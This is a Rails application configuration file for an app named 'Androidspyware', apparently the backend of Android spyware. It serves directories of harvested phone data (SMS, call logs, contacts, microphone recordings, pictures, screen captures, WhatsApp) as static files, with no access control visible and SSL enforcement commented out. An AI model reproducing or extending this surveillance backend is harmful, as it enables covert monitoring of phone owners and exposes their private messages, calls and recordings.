require_relative "boot"

require "rails/all"

# Require the gems listed in Gemfile, including any gems
# you've limited to :test, :development, or :production.
Bundler.require(*Rails.groups)

module Androidspyware
  class Application < Rails::Application
    # Initialize configuration defaults for originally generated Rails version.
    config.load_defaults 6.0
    config.autoload_paths << Rails.root.join("app", "graphql")
    config.autoload_paths << Rails.root.join("app", "middleware")
    config.autoload_paths << Rails.root.join("app", "validators")
    config.middleware.use Rack::Attack
    require_relative '../app/middleware/input_sanitization_middleware'
    require_relative '../app/middleware/audit_middleware'
    require_relative '../app/middleware/security_headers'
    require_relative '../app/middleware/consent_enforcement'
    config.middleware.use InputSanitizationMiddleware
    config.middleware.use AuditMiddleware
    config.middleware.use SecurityHeaders
    config.middleware.use ConsentEnforcement
    config.spyware_config = config_for(:spyware_config)
    # config.web_console.whiny_requests = false if config.respond_to?(:web_console)
    config.serve_static_files = true
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("sms_messages_dumps").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("calllogs_dumps").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("contacts_dumps").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("microphone_recs").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("pictures").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("screen_snaps").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("whatsapp").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}

    #config.force_ssl = true

    # SECURITY: Mask sensitive parameters in logs
    config.filter_parameters += [
      :password, :password_confirmation, :token, :device_auth_token, 
      :signature, :secret, :api_key, :credential, :otp_attempt,
      :sms_body, :keystroke, :latitude, :longitude # Data privacy
    ]

    # Settings in config/environments/* take precedence over those specified here.
    # Application configuration can go into files in config/initializers
    # -- all .rb files in that directory are automatically loaded after loading
    # the framework and any gems in your application.
  end
end
